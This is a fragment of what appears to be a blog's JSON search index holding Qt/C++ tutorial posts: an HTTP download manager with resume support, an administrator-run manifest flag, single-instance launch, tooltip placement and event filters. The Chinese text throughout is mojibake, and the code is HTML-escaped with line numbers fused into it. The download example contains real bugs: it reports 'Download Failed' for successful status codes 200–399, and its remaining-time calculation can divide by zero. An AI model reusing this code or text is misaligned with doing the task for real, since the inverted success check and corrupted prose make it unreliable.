m_pManager-&gt;get(request); // get æ–¹å¼ connect(m_pReply, &amp;QNetworkReply::readyRead, this, &amp;QHttpDownloadObject::onReadyRead); connect(m_pReply, &amp;QNetworkReply::downloadProgress, this, &amp;QHttpDownloadObject::downloadProgress); // ä½¿ç”¨å½“å‰æ¥å£åˆ¤æ–­ä¸‹è½½æ—¶å¦å¼‚å¸¸ connect(m_pReply, static_cast&lt;void(QNetworkReply::*)(QNetworkReply::NetworkError)&gt;(&amp;QNetworkReply::error), this, &amp;QHttpDownloadObject::onError);&#125;void QHttpDownloadObject::slotRequestFinished(QNetworkReply *reply)&#123; disconnect(m_pReply, SIGNAL(downloadProgress(qint64, qint64)), this, SIGNAL(downloadProgress(qint64, qint64))); if (m_fileTmp.isOpen()) &#123; m_fileTmp.close(); &#125; // è·å–å“åº”çš„ä¿¡æ¯ï¼ŒçŠ¶æ€ç ä¸º200è¡¨ç¤ºæ­£å¸¸ QVariant statusCode = reply-&gt;attribute(QNetworkRequest::HttpStatusCodeAttribute); QString strError = reply-&gt;errorString(); QNetworkReply::NetworkError error = reply-&gt;error(); qDebug() &lt;&lt; &quot;+++++++++&quot; &lt;&lt; statusCode &lt;&lt; strError &lt;&lt; error; // QVariant(int, 200) &quot;Connection closed&quot; QNetworkReply::NetworkError(RemoteHostClosedError) if (statusCode.toInt() &gt;= 400 || error != QNetworkReply::NoError) &#123; QLOG_INFO() &lt;&lt; &quot;æ— æ³•ä¸‹è½½æ–‡ä»¶ï¼Œé”™è¯¯çŠ¶æ€ç :&quot; &lt;&lt; statusCode &lt;&lt; &quot;é”™è¯¯ä¿¡æ¯:&quot; &lt;&lt; strError &lt;&lt; error; emit sigDownloadFinished(DOWNLOAD_CODE_NETBAD, QString(ERRORTITLE_APPACCESS_NETFAULT).arg(strError)); &#125; else &#123; emit sigDownloadFinished(statusCode.toInt(), strError); &#125; reply-&gt;close(); reply-&gt;deleteLater(); m_pManager-&gt;deleteLater(); m_pOnlinemanager-&gt;deleteLater();&#125; 15 ç®¡ç†å‘˜è¿è¡Œç¨‹åº ç®¡ç†å‘˜è¿è¡Œç¨‹åºï¼Œé™å®šåœ¨MSVCç¼–è¯‘å™¨ï¼Œåœ¨é¡¹ç›®proæ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹ä»£ç ã€‚ 12QMAKE_LFLAGS += /MANIFESTUAC:&quot;level=&#x27;requireAdministrator&#x27; uiAccess=&#x27;false&#x27;&quot; #ä»¥ç®¡ç†å‘˜è¿è¡ŒQMAKE_LFLAGS += /SUBSYSTEM:WINDOWS,&quot;5.01&quot; #VS2013 åœ¨XPè¿è¡Œ 16 QLabel ç‚¹å‡»äº‹ä»¶ é‡å†™ QLabel äº‹ä»¶ 123456void QCycleProgress::mousePressEvent(QMouseEvent* event)&#123; emit clicked(); QLabel::mousePressEvent(event);&#125; 17 ç¨‹åºé˜²é‡å…¥ 123456789101112131415161718192021222324#include &quot;qrcode.h&quot;#include &lt;QSharedMemory&gt;#include &lt;QApplication&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv); //åˆ›å»ºè¿è¡Œæ—¶åªå…è®¸å­˜åœ¨ä¸€ä¸ªç¨‹åº static QSharedMemory *shareMem = new QSharedMemory(&quot;SingleAPP&quot;); //åˆ¤æ–­å¦‚æœå­˜åœ¨å­˜ç›´æ¥é€€å‡º if(!shareMem-&gt;create(1))&#123; qApp-&gt;quit(); return -1; &#125;else&#123; int result = -1; while (result !=0) &#123; Create_qrcode w; w.setWindowIcon(QIcon(&quot;:/images/main_logo.ico&quot;)); w.show(); result= a.exec(); //!é€€å‡ºæ—¶å¦‚æœä¸ºé›¶ï¼Œæ­£å¸¸é€€å‡ºï¼Œå¦åˆ™é‡å¯ç¨‹åº &#125; return result; &#125;&#125; 18 å¼¹çª—æ˜¾ç¤ºåœ¨å±å¹•ä¸­é—´ ä½¿ç”¨ 12345678void QTrayTooltipForm::show()&#123; placeTip(QCursor::pos()); UpdateStatus(); return QWidget::show();&#125; 1234567891011121314151617181920void QTrayTooltipForm::placeTip(const QPoint&amp; pos)&#123; QRect screen = QApplication::desktop()-&gt;screenGeometry(QApplication::desktop()-&gt;screenNumber(pos)); QPoint p = pos; p += QPoint(2,16); if (p.x() + this-&gt;width() &gt; screen.x() + screen.width()) p.rx() -= 4 + this-&gt;width(); if (p.y() + this-&gt;height() &gt; screen.y() + screen.height()) p.ry() -= 24 + this-&gt;height(); if (p.y() &lt; screen.y()) p.setY(screen.y()); if (p.x() + this-&gt;width() &gt; screen.x() + screen.width()) p.setX(screen.x() + screen.width() - this-&gt;width()); if (p.x() &lt; screen.x()) p.setX(screen.x()); if (p.y() + this-&gt;height() &gt; screen.y() + screen.height()) p.setY(screen.y() + screen.height() - this-&gt;height()); this-&gt;move(p);&#125;","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘å¿«æ·é”®ä»¥åŠå…¨å±€æ³¨å†Œ","date":"2023-10-27T01:24:02.242Z","path":"B_Code/Qt/ã€Qtã€‘å…¨å±€æ³¨å†Œå¿«æ·é”®/","text":"Qt_Code_Collections/QGlobalKeyShort at main Â· holdyounger/Qt_Code_Collections","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘Qt Http ä¸‹è½½ï¼ˆè½¬è½½ï¼‰","date":"2023-10-27T01:24:02.241Z","path":"B_Code/Qt/ã€Qtã€‘QtHttpä¸‹è½½/","text":"QTä¹‹HTTPè¯·æ±‚ä¸‹è½½ æ ‡ç­¾ï¼š Qt HTTP ç®€è¿° æœ€è¿‘åœ¨ç ”ç©¶äº†ä¸€ä¸‹ç”¨Qt çš„æ–¹æ³•æ¥å®ç°httpä¸‹è½½ï¼ŒQt ä¸­çš„Httpè¯·æ±‚ä¸»è¦ç”¨åˆ°äº†QNetworkAccessManagerã€QNetworkReplyã€QNetworkRequest è¿™ä¸‰å—ã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦å™è¿°å¦‚ä½•ç”¨Qt çš„æ–¹æ³•è¿›è¡ŒHTTP è¯·æ±‚ä¸‹è½½æ–‡ä»¶ï¼Œèƒ½å¤Ÿæ”¯æŒ****æ–­ç‚¹ç»­ä¼ ****ï¼ˆæ–­ç‚¹ç»­ä¼ å³èƒ½å¤Ÿæ‰‹åŠ¨åœæ­¢ä¸‹è½½ï¼Œä¸‹æ¬¡å¯ä»¥ä»å·²ç»ä¸‹è½½çš„éƒ¨åˆ†å¼€å§‹ç»§ç»­ä¸‹è½½æœªå®Œæˆçš„éƒ¨åˆ†ï¼Œè€Œæ²¡æœ‰å¿…è¦ä»å¤´å¼€å§‹ä¸Šä¼ ä¸‹è½½ï¼‰ï¼Œå¹¶ä¸”å®æ—¶æ›´æ–°ä¸‹è½½ä¿¡æ¯ã€‚æ•´ä½“ä»£ç è€ƒè™‘ååˆ†å‘¨åˆ°ï¼Œå¯¹å„ç§æƒ…å†µä¹Ÿåšäº†ç›¸åº”çš„å¤„ç†ï¼Œå¹¶ä¸”æœ‰é€šä¿—æ˜“æ‡‚çš„æ³¨é‡Šã€‚å¥½äº†ï¼Œä»£ç èµ°èµ·ï¼ ä»£ç ä¹‹è·¯ åœ¨è®²è§£ä»£ç ä¹‹å‰å…ˆçœ‹ä¸€ä¸‹æ•ˆæœå›¾ï¼š æ•ˆæœï¼š ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºç‚¹å‡»startæŒ‰é’®ï¼Œè¿›è¡Œä¸‹è½½ï¼ŒstopæŒ‰é’®æš‚åœå½“å‰ä¸‹è½½ï¼ŒcloseæŒ‰é’®åœæ­¢å½“å‰ä¸‹è½½ï¼Œå¹¶åˆ é™¤å·²ç»ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¹¶å°†æ‰€æœ‰å‚æ•°é‡ç½®ï¼Œ è¿™é‡Œç•Œé¢ä¸­ä¸‹è½½é“¾æ¥è¾“å…¥æ¡†ä¸ºç©ºæ˜¯å› ä¸ºæˆ‘åœ¨ä»£ç ä¸­é»˜è®¤äº†urlï¼Œä¹Ÿå¯ä»¥åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥urlè¿›è¡Œä¸‹è½½ã€‚ ä»£ç ä¸»è¦åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š 1ã€DownLoadManager ï¼š ç”¨æ¥è¯·æ±‚ä¸‹è½½ï¼Œå‘ç•Œé¢ä¼ é€’ä¸‹è½½ä¿¡æ¯ï¼Œå¹¶å°†ä¸‹è½½çš„å†…å®¹ä¿å­˜åˆ°æ–‡ä»¶ä¸­ 2ã€MyHttpDownload ï¼š ç”¨æ¥æ¥æ”¶ä¸‹è½½é“¾æ¥ï¼Œåˆ©ç”¨DownLoadManagerè¿›è¡Œä¸‹è½½ï¼Œæ›´æ–°ç•Œé¢ï¼Œå¹¶å¯¹å½“å‰ä¸‹è½½è¿›è¡Œæ“ä½œï¼ˆåŒ…æ‹¬ï¼šå¼€å§‹ã€æš‚åœã€åœæ­¢ä¸‹è½½ï¼‰ã€‚ 1ã€DOWNLOADMANAGER 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197#include &quot;downloadmanager.h&quot;#include &lt;QFile&gt;#include &lt;QDebug&gt;#include &lt;QFileInfo&gt;#include &lt;QDir&gt; #define DOWNLOAD_FILE_SUFFIX &quot;_tmp&quot; DownLoadManager::DownLoadManager(QObject *parent) : QObject(parent) , m_networkManager(NULL) , m_url(QUrl(&quot;&quot;)) , m_fileName(&quot;&quot;) , m_isSupportBreakPoint(false) , m_bytesReceived(0) , m_bytesTotal(0) , m_bytesCurrentReceived(0) , m_isStop(true)&#123; m_networkManager = new QNetworkAccessManager(this);&#125; DownLoadManager::~DownLoadManager()&#123;&#125; // è®¾ç½®æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼ ;void DownLoadManager::setDownInto(bool isSupportBreakPoint)&#123; m_isSupportBreakPoint = isSupportBreakPoint;&#125; // è·å–å½“å‰ä¸‹è½½é“¾æ¥;QString DownLoadManager::getDownloadUrl()&#123; return m_url.toString();&#125; // å¼€å§‹ä¸‹è½½æ–‡ä»¶ï¼Œä¼ å…¥ä¸‹è½½é“¾æ¥å’Œæ–‡ä»¶çš„è·¯å¾„;void DownLoadManager::downloadFile(QString url , QString fileName)&#123; // é˜²æ­¢å¤šæ¬¡ç‚¹å‡»å¼€å§‹ä¸‹è½½æŒ‰é’®ï¼Œè¿›è¡Œå¤šæ¬¡ä¸‹è½½ï¼Œåªæœ‰åœ¨åœæ­¢æ ‡å¿—å˜é‡ä¸ºtrueæ—¶æ‰è¿›è¡Œä¸‹è½½; if (m_isStop) &#123; m_isStop = false; m_url = QUrl(url); // è¿™é‡Œå¯ç”¨ä»urlä¸­è·å–æ–‡ä»¶åï¼Œä½†ä¸æ˜¯å¯¹æ‰€æœ‰çš„urléƒ½æœ‰æ•ˆ;// QString fileName = m_url.fileName(); // å°†å½“å‰æ–‡ä»¶åè®¾ç½®ä¸ºä¸´æ—¶æ–‡ä»¶åï¼Œä¸‹è½½å®Œæˆæ—¶ä¿®æ”¹å›æ¥; m_fileName = fileName + DOWNLOAD_FILE_SUFFIX; // å¦‚æœå½“å‰ä¸‹è½½çš„å­—èŠ‚æ•°ä¸º0é‚£ä¹ˆè¯´æ˜æœªä¸‹è½½è¿‡æˆ–è€…é‡æ–°ä¸‹è½½ // åˆ™éœ€è¦æ£€æµ‹æœ¬åœ°æ˜¯å¦å­˜åœ¨ä¹‹å‰ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœæœ‰åˆ™åˆ é™¤ if (m_bytesCurrentReceived &lt;= 0) &#123; removeFile(m_fileName); &#125; QNetworkRequest request; request.setUrl(m_url); // å¦‚æœæ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œåˆ™è®¾ç½®è¯·æ±‚å¤´ä¿¡æ¯ if (m_isSupportBreakPoint) &#123; QString strRange = QString(&quot;bytes=%1-&quot;).arg(m_bytesCurrentReceived); request.setRawHeader(&quot;Range&quot;, strRange.toLatin1()); &#125; // è¯·æ±‚ä¸‹è½½; m_reply = m_networkManager-&gt;get(request); connect(m_reply, SIGNAL(downloadProgress(qint64, qint64)), this, SLOT(onDownloadProgress(qint64, qint64))); connect(m_reply, SIGNAL(readyRead()), this, SLOT(onReadyRead())); connect(m_reply, SIGNAL(finished()), this, SLOT(onFinished())); connect(m_reply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(onError(QNetworkReply::NetworkError))); &#125; &#125; // ä¸‹è½½è¿›åº¦ä¿¡æ¯;void DownLoadManager::onDownloadProgress(qint64 bytesReceived, qint64 bytesTotal)&#123; if (!m_isStop) &#123; m_bytesReceived = bytesReceived; m_bytesTotal = bytesTotal; // æ›´æ–°ä¸‹è½½è¿›åº¦;(åŠ ä¸Š m_bytesCurrentReceived æ˜¯ä¸ºäº†æ–­ç‚¹ç»­ä¼ æ—¶ä¹‹å‰ä¸‹è½½çš„å­—èŠ‚) emit signalDownloadProcess(m_bytesReceived + m_bytesCurrentReceived, m_bytesTotal + m_bytesCurrentReceived); &#125; &#125; // è·å–ä¸‹è½½å†…å®¹ï¼Œä¿å­˜åˆ°æ–‡ä»¶ä¸­;void DownLoadManager::onReadyRead()&#123; if (!m_isStop) &#123; QFile file(m_fileName); if (file.open(QIODevice::WriteOnly | QIODevice::Append)) &#123; file.write(m_reply-&gt;readAll()); &#125; file.close(); &#125; &#125; // ä¸‹è½½å®Œæˆ;void DownLoadManager::onFinished()&#123; m_isStop = true; // httpè¯·æ±‚çŠ¶æ€ç ; QVariant statusCode = m_reply-&gt;attribute(QNetworkRequest::HttpStatusCodeAttribute); if (m_reply-&gt;error() == QNetworkReply::NoError) &#123; // é‡å‘½åä¸´æ—¶æ–‡ä»¶; QFileInfo fileInfo(m_fileName); if (fileInfo.exists()) &#123; int index = m_fileName.lastIndexOf(DOWNLOAD_FILE_SUFFIX); QString realName = m_fileName.left(index); QFile::rename(m_fileName, realName); &#125; &#125; else &#123; // æœ‰é”™è¯¯è¾“å‡ºé”™è¯¯; QString strError = m_reply-&gt;errorString(); qDebug() &lt;&lt; &quot;__________&quot; + strError; &#125; emit signalReplyFinished(statusCode.toInt());&#125; // ä¸‹è½½è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œå…³é—­ä¸‹è½½ï¼Œå¹¶ä¸ŠæŠ¥é”™è¯¯ï¼Œè¿™é‡Œæœªä¸ŠæŠ¥é”™è¯¯ç±»å‹ï¼Œå¯è‡ªå·±å®šä¹‰è¿›è¡Œä¸ŠæŠ¥;void DownLoadManager::onError(QNetworkReply::NetworkError code)&#123; QString strError = m_reply-&gt;errorString(); qDebug() &lt;&lt; &quot;__________&quot; + strError; closeDownload(); emit signalDownloadError();&#125; // åœæ­¢ä¸‹è½½å·¥ä½œ;void DownLoadManager::stopWork()&#123; m_isStop = true; if (m_reply != NULL) &#123; disconnect(m_reply, SIGNAL(downloadProgress(qint64, qint64)), this, SLOT(onDownloadProgress(qint64, qint64))); disconnect(m_reply, SIGNAL(readyRead()), this, SLOT(onReadyRead())); disconnect(m_reply, SIGNAL(finished()), this, SLOT(onFinished())); disconnect(m_reply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(onError(QNetworkReply::NetworkError))); m_reply-&gt;abort(); m_reply-&gt;deleteLater(); m_reply = NULL; &#125;&#125; // æš‚åœä¸‹è½½æŒ‰é’®è¢«æŒ‰ä¸‹,æš‚åœå½“å‰ä¸‹è½½;void DownLoadManager::stopDownload()&#123; // è¿™é‡Œm_isStopå˜é‡ä¸ºäº†ä¿æŠ¤å¤šæ¬¡ç‚¹å‡»æš‚åœä¸‹è½½æŒ‰é’®ï¼Œå¯¼è‡´m_bytesCurrentReceived è¢«ä¸åœç´¯åŠ ; if (!m_isStop) &#123; //è®°å½•å½“å‰å·²ç»ä¸‹è½½å­—èŠ‚æ•° m_bytesCurrentReceived += m_bytesReceived; stopWork(); &#125; &#125; // é‡ç½®å‚æ•°;void DownLoadManager::reset()&#123; m_bytesCurrentReceived = 0; m_bytesReceived = 0; m_bytesTotal = 0;&#125; // åˆ é™¤æ–‡ä»¶;void DownLoadManager::removeFile(QString fileName)&#123; // åˆ é™¤å·²ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶; QFileInfo fileInfo(fileName); if (fileInfo.exists()) &#123; QFile::remove(fileName); &#125;&#125; // åœæ­¢ä¸‹è½½æŒ‰é’®è¢«æŒ‰ä¸‹ï¼Œå…³é—­ä¸‹è½½ï¼Œé‡ç½®å‚æ•°ï¼Œå¹¶åˆ é™¤ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶;void DownLoadManager::closeDownload()&#123; stopWork(); reset(); removeFile(m_fileName);&#125; 2ã€MYHTTPDOWNLOAD 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238#include &quot;myhttpdownload.h&quot;#include &quot;downloadmanager.h&quot;#include &lt;QDebug&gt; #define UNIT_KB 1024 //KB#define UNIT_MB 1024*1024 //MB#define UNIT_GB 1024*1024*1024 //GB #define TIME_INTERVAL 300 //0.3s MyHttpDownload::MyHttpDownload(QWidget *parent) : QWidget(parent) , m_downloadManager(NULL) , m_url(&quot;&quot;) , m_timeInterval(0) , m_currentDownload(0) , m_intervalDownload(0)&#123; ui.setupUi(this); initWindow();&#125; MyHttpDownload::~MyHttpDownload()&#123; &#125; void MyHttpDownload::initWindow()&#123; ui.progressBar-&gt;setValue(0); connect(ui.pButtonStart, SIGNAL(clicked()), this, SLOT(onStartDownload())); connect(ui.pButtonStop, SIGNAL(clicked()), this, SLOT(onStopDownload())); connect(ui.pButtonClose, SIGNAL(clicked()), this, SLOT(onCloseDownload())); // è¿›åº¦æ¡è®¾ç½®æ ·å¼; ui.progressBar-&gt;setStyleSheet(&quot;\\ QProgressBar\\ &#123;\\ border-width: 0 10 0 10;\\ border-left: 1px, gray;\\ border-right: 1px, gray;\\ border-image:url(:/Resources/progressbar_back.png);\\ &#125;\\ QProgressBar::chunk\\ &#123;\\ border-width: 0 10 0 10;\\ border-image:url(:/Resources/progressbar.png);\\ &#125;&quot;);&#125; // å¼€å§‹ä¸‹è½½;void MyHttpDownload::onStartDownload()&#123; // ä»ç•Œé¢è·å–ä¸‹è½½é“¾æ¥; m_url = ui.downloadUrl-&gt;text(); if (m_downloadManager == NULL) &#123; m_downloadManager = new DownLoadManager(this); connect(m_downloadManager , SIGNAL(signalDownloadProcess(qint64, qint64)), this, SLOT(onDownloadProcess(qint64, qint64))); connect(m_downloadManager, SIGNAL(signalReplyFinished(int)), this, SLOT(onReplyFinished(int))); &#125; // è¿™é‡Œå…ˆè·å–åˆ°m_downloadManagerä¸­çš„urlä¸å½“å‰çš„m_url å¯¹æ¯”ï¼Œå¦‚æœurlå˜äº†éœ€è¦é‡ç½®å‚æ•°,é˜²æ­¢æ–‡ä»¶ä¸‹è½½ä¸å…¨; QString url = m_downloadManager-&gt;getDownloadUrl(); if (url != m_url) &#123; m_downloadManager-&gt;reset(); &#125; m_downloadManager-&gt;setDownInto(true); m_downloadManager-&gt;downloadFile(m_url, &quot;F:/MyHttpDownload/MyDownloadFile.zip&quot;); m_timeRecord.start(); m_timeInterval = 0; ui.labelStatus-&gt;setText(QStringLiteral(&quot;æ­£åœ¨ä¸‹è½½&quot;));&#125; // æš‚åœä¸‹è½½;void MyHttpDownload::onStopDownload()&#123; ui.labelStatus-&gt;setText(QStringLiteral(&quot;åœæ­¢ä¸‹è½½&quot;)); if (m_downloadManager != NULL) &#123; m_downloadManager-&gt;stopDownload(); &#125; ui.labelSpeed-&gt;setText(&quot;0 KB/S&quot;); ui.labelRemainTime-&gt;setText(&quot;0s&quot;);&#125; // å…³é—­ä¸‹è½½;void MyHttpDownload::onCloseDownload()&#123; m_downloadManager-&gt;closeDownload(); ui.progressBar-&gt;setValue(0); ui.labelSpeed-&gt;setText(&quot;0 KB/S&quot;); ui.labelRemainTime-&gt;setText(&quot;0s&quot;); ui.labelStatus-&gt;setText(QStringLiteral(&quot;å…³é—­ä¸‹è½½&quot;)); ui.labelCurrentDownload-&gt;setText(&quot;0 B&quot;); ui.labelFileSize-&gt;setText(&quot;0 B&quot;);&#125; // æ›´æ–°ä¸‹è½½è¿›åº¦;void MyHttpDownload::onDownloadProcess(qint64 bytesReceived, qint64 bytesTotal)&#123; // è¾“å‡ºå½“å‰ä¸‹è½½è¿›åº¦; // ç”¨åˆ°é™¤æ³•éœ€è¦æ³¨æ„é™¤0é”™è¯¯; qDebug() &lt;&lt; QString(&quot;%1&quot;).arg(bytesReceived * 100 / bytesTotal + 1); // æ›´æ–°è¿›åº¦æ¡; ui.progressBar-&gt;setMaximum(bytesTotal); ui.progressBar-&gt;setValue(bytesReceived); // m_intervalDownload ä¸ºä¸‹æ¬¡è®¡ç®—é€Ÿåº¦ä¹‹å‰çš„ä¸‹è½½å­—èŠ‚æ•°; m_intervalDownload += bytesReceived - m_currentDownload; m_currentDownload = bytesReceived; uint timeNow = m_timeRecord.elapsed(); // è¶…è¿‡0.3sæ›´æ–°è®¡ç®—ä¸€æ¬¡é€Ÿåº¦; if (timeNow - m_timeInterval &gt; TIME_INTERVAL) &#123; qint64 ispeed = m_intervalDownload * 1000 / (timeNow - m_timeInterval); QString strSpeed = transformUnit(ispeed, true); ui.labelSpeed-&gt;setText(strSpeed); // å‰©ä½™æ—¶é—´; qint64 timeRemain = (bytesTotal - bytesReceived) / ispeed; ui.labelRemainTime-&gt;setText(transformTime(timeRemain)); ui.labelCurrentDownload-&gt;setText(transformUnit(m_currentDownload)); ui.labelFileSize-&gt;setText(transformUnit(bytesTotal)); m_intervalDownload = 0; m_timeInterval = timeNow; &#125;&#125; // ä¸‹è½½å®Œæˆ;void MyHttpDownload::onReplyFinished(int statusCode)&#123; // æ ¹æ®çŠ¶æ€ç åˆ¤æ–­å½“å‰ä¸‹è½½æ˜¯å¦å‡ºé”™; if (statusCode &gt;= 200 &amp;&amp; statusCode &lt; 400) &#123; qDebug() &lt;&lt; &quot;Download Failed&quot;; &#125; else &#123; qDebug() &lt;&lt; &quot;Download Success&quot;; &#125;&#125; // è½¬æ¢å•ä½;QString MyHttpDownload::transformUnit(qint64 bytes , bool isSpeed)&#123; QString strUnit = &quot; B&quot;; if (bytes &lt;= 0) &#123; bytes = 0; &#125; else if (bytes &lt; UNIT_KB) &#123; &#125; else if (bytes &lt; UNIT_MB) &#123; bytes /= UNIT_KB; strUnit = &quot; KB&quot;; &#125; else if (bytes &lt; UNIT_GB) &#123; bytes /= UNIT_MB; strUnit = &quot; MB&quot;; &#125; else if (bytes &gt; UNIT_GB) &#123; bytes /= UNIT_GB; strUnit = &quot; GB&quot;; &#125; if (isSpeed) &#123; strUnit += &quot;/S&quot;; &#125; return QString(&quot;%1%2&quot;).arg(bytes).arg(strUnit);&#125; // è½¬æ¢æ—¶é—´;QString MyHttpDownload::transformTime(qint64 seconds)&#123; QString strValue; QString strSpacing(&quot; &quot;); if (seconds &lt;= 0) &#123; strValue = QString(&quot;%1s&quot;).arg(0); &#125; else if (seconds &lt; 60) &#123; strValue = QString(&quot;%1s&quot;).arg(seconds); &#125; else if (seconds &lt; 60 * 60) &#123; int nMinute = seconds / 60; int nSecond = seconds - nMinute * 60; strValue = QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; else if (seconds &lt; 60 * 60 * 24) &#123; int nHour = seconds / (60 * 60); int nMinute = (seconds - nHour * 60 * 60) / 60; int nSecond = seconds - nHour * 60 * 60 - nMinute * 60; strValue = QString(&quot;%1h&quot;).arg(nHour); if (nMinute &gt; 0) strValue += strSpacing + QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; else &#123; int nDay = seconds / (60 * 60 * 24); int nHour = (seconds - nDay * 60 * 60 * 24) / (60 * 60); int nMinute = (seconds - nDay * 60 * 60 * 24 - nHour * 60 * 60) / 60; int nSecond = seconds - nDay * 60 * 60 * 24 - nHour * 60 * 60 - nMinute * 60; strValue = QString(&quot;%1d&quot;).arg(nDay); if (nHour &gt; 0) strValue += strSpacing + QString(&quot;%1h&quot;).arg(nHour); if (nMinute &gt; 0) strValue += strSpacing + QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; return strValue;&#125; æ ‡æ³¨ï¼š ä»£ç æ³¨é‡Šä¸­æåˆ°å¯ä»¥æ ¹æ®URLæ¥è·å–æ–‡ä»¶åï¼Œä¸‹æ–¹ç»™äºˆè§£é‡Šè¯´æ˜ã€‚ QString QUrl::fileName(ComponentFormattingOptions options = FullyDecoded) const Returns the name of the file, excluding the directory path. Note that, if this QUrl object is given a path ending in a slash, the name of the file is considered empty. If the path doesnâ€™t contain any slash, it is fully returned as the fileName. åœ¨QtåŠ©æ‰‹ä¸­æˆ‘ä»¬æ‰¾åˆ°æ­¤æ–¹æ³•ï¼Œæ ¹æ®åŠ ç²—çš„å­—æ®µå¯ä»¥çœ‹å‡ºfileName()æ–¹æ³•ä¹Ÿå¯èƒ½è¿”å›ä¸ºç©ºï¼Œæ‰€ä»¥ä¸æ˜¯éƒ½æœ‰æ•ˆã€‚","tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://hodlyounger.github.io/tags/HTTP/"},{"name":"Qt/QNetWork","slug":"Qt-QNetWork","permalink":"https://hodlyounger.github.io/tags/Qt-QNetWork/"},{"name":"Qt/QNetworkRequest","slug":"Qt-QNetworkRequest","permalink":"https://hodlyounger.github.io/tags/Qt-QNetworkRequest/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘äº‹ä»¶è¿‡æ»¤å™¨ï¼ˆeventFilterï¼‰","date":"2023-10-27T01:24:02.240Z","path":"B_Code/Qt/ã€Qtã€‘è¿‡æ»¤å™¨/","text":"[toc] äº‹ä»¶è¿‡æ»¤å™¨ 1void QObject::installEventFilter(QObject *filterObj) 1bool eventFilter(QObject *obj, QEvent *event); Qtçš„äº‹ä»¶è¿‡æ»¤ç”±ä»¥ä¸Šä¸¤ä¸ªæ–¹æ³•å®ç°ï¼Œé¦–å…ˆå®‰è£…ä¸€ä¸ªäº‹ä»¶è¿‡æ»¤å™¨ï¼Œç„¶åé‡å†™ bool eventFilter(QObject *obj, QEvent *event)ã€‚ filterObjè¡¨ç¤ºäº‹ä»¶ç­›é€‰å™¨å¯¹è±¡ï¼Œå®ƒæ¥æ”¶å‘é€åˆ°æ­¤QObjectå¯¹è±¡çš„æ‰€æœ‰äº‹ä»¶ã€‚ç­›é€‰å™¨å¯ä»¥åœæ­¢äº‹ä»¶ï¼Œä¹Ÿå¯ä»¥å°†äº‹ä»¶è½¬å‘ç»™æ­¤QObjectå¯¹è±¡ã€‚äº‹ä»¶è¿‡æ»¤å™¨filterObjé€šè¿‡å®ƒçš„eventFilter()å‡½æ•°æ¥æ”¶äº‹ä»¶ã€‚ ç®€å•å®ç° å½“é¼ æ ‡è¿›å…¥ lineEdit çš„æ—¶å€™å¹¶ä¸”æ“ä½œæ—¶ HoverEnter çš„æ—¶å€™ï¼Œåˆ™ä¿®æ”¹ QLabel çš„é¢œè‰²ã€‚ å®‰è£…äº‹ä»¶è¿‡æ»¤å™¨ 1ui-&gt;lineEdit-&gt;installEventFilter(this); é‡å†™ eventFilter() 1234567891011121314151617181920bool Widget::eventFilter(QObject *wcg, QEvent *event)&#123; if (wcg == ui-&gt;lineEdit) &#123; if(event-&gt;type() == QEvent::HoverEnter) &#123; ui-&gt;label_2-&gt;setText(QString(&quot;è¿›å…¥&quot;)); ui-&gt;label_2-&gt;setStyleSheet(&quot;QLabel&#123;color:red;&#125;&quot;); qDebug() &lt;&lt; &quot;è¿›å…¥&quot; &lt;&lt; endl; &#125; else if(event-&gt;type() == QEvent::HoverLeave) &#123; ui-&gt;label_2-&gt;setText(QString(&quot;ç¦»å¼€&quot;)); ui-&gt;label_2-&gt;setStyleSheet(&quot;QLabel&#123;color:green;&#125;&quot;); qDebug() &lt;&lt; &quot;ç¦»å¼€&quot; &lt;&lt; endl; &#125; &#125; return 